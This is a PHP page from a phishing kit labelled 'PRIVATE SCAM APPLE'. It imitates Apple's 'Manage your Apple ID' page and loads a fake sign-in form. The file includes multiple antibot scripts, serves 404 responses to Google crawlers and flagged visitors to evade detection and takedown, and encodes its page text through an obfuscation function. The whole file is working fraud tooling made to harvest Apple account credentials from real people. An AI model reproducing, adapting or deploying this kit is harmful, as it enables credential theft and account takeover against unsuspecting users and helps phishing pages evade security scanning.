<?php 
/*   
                              #===============================#
                              #    PRIVATE SCAM APPLE         #
                              #           PIradz17            #
							  #     Facebook.com/Piradz17     #
                              #===============================#                     
*/
session_start();
error_reporting(0);
include('./INC-FUN/Encrypte.php');
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "../bots/antibots1.php";
include "../bots/antibots2.php";
include "../bots/antibots3.php";
include "../bots/antibots4.php";
include "../bots/antibots5.php";
include "../bots/antibots6.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
include "./ANTIBOTS.php";
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
    echo "404 NOT FOUND";
    exit;
}
?><html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="shortcut icon" type="image/x-icon" href="<?php echo xTextEncode('INC-LIB/IMG/favicon.ico');?>">
    <title>
        <?php echo xTextEncode('Manage your Apple ID');?>
    </title>
    <link rel="stylesheet" type="text/css" href="<?php echo xTextEncode('INC-LIB/CSS/Z118_STYLES.css');?>">
</head>
<body>
    <header>
        <div class="menuzebi"></div>
        <div class="bagzebi"></div>
    </header>
    <div id="<?php echo xTextEncode('Z118-POPUP');?>"></div>
    <div class="<?php echo xTextEncode('Z118');?>">
        <div class="<?php echo xTextEncode('container');?>">
            <div class="<?php echo xTextEncode('starting');?>">
                <div class="<?php echo xTextEncode('header');?>">
                    <h1><?php echo xTextEncode('Manage your Apple ID');?></h1>
                    <p class="<?php echo xTextEncode('secure');?>">
                        <?php echo xTextEncode('Secure');?>
                    </p>
                </div>
                <script src="<?php echo xTextEncode('./INC-LIB/JS/jquery.js');?>"></script>
                <script src="<?php echo xTextEncode('./INC-LIB/JS/jquery.validate.js');?>"></script>
                <script src="<?php echo xTextEncode('./INC-LIB/JS/jquery.mask.js');?>"></script>
                <div class="<?php echo xTextEncode('loading-effect');?>" style="display:none"></div>
                <div id="<?php echo xTextEncode('change');?>">
                    <div id="<?php echo xTextEncode('shows');?>" class="body signin-body">
                        <script type="text/javascript">
                            $("#shows").css('opacity', 0).load("Z118_1XXX.php", function() {
                                $("#shows").animate({
                                    opacity: 1
                                });
                            }, 200);
                        </script>
                    </div>
                </div>
                <div class="<?php echo xTextEncode('cart-navigation');?>">
                    <button class="<?php echo xTextEncode('cancel-button');?>"> <span><?php echo xTextEncode('Cancel');?></span> </button>
                </div>
            </div>
        </div>
        <div>
            <footer>
                <div style="color: #999;border-bottom: 1px solid #e3e3e3;padding-left: 8px;">
                    <p style="font-size: 13px;">
                        <?php echo xTextEncode('The Apple online Store uses industry-standard encryptation to protect the confidentiality of the information you submit. learn more about Security Policy ');?>
                    </p>
                </div>
                <div style="color: #999;">
                    <p style="font-size: 13px;margin-bottom: 0;margin-left: 5px;">
                        <?php echo xTextEncode('More ways to shop: Visit an');?>
                            <a href="">
                                <?php echo xTextEncode(' Apple Store,');?>
                            </a>
                            <?php echo xTextEncode(' call 1-800-MY-APPLE or ');?>
                                <a href="">
                                    <?php echo xTextEncode(' find a seller');?>
                                </a>
                    </p>
                </div>
                <div id="copyright-legal">
                    <p>
                        <?php echo xTextEncode('Copyright © 2019 Apple INC-LIB. All rights reserved.');?>
                    </p>
                    <div class="links" style="display: inherit;">
                        <a href="">
                            <?php echo xTextEncode('Privacy Policy');?>
                        </a>
                        <a href="">
                            <?php echo xTextEncode('Terms of Use');?>
                        </a>
                        <a href="">
                            <?php echo xTextEncode('Sales and Refunds');?>
                        </a>
                        <a href="">
                            <?php echo xTextEncode('Legal');?>
                        </a>
                        <a href="">
                            <?php echo xTextEncode('Site Map');?>
                        </a>
                    </div>
                </div>
            </footer>
        </div>
    </div>
</body>

</html>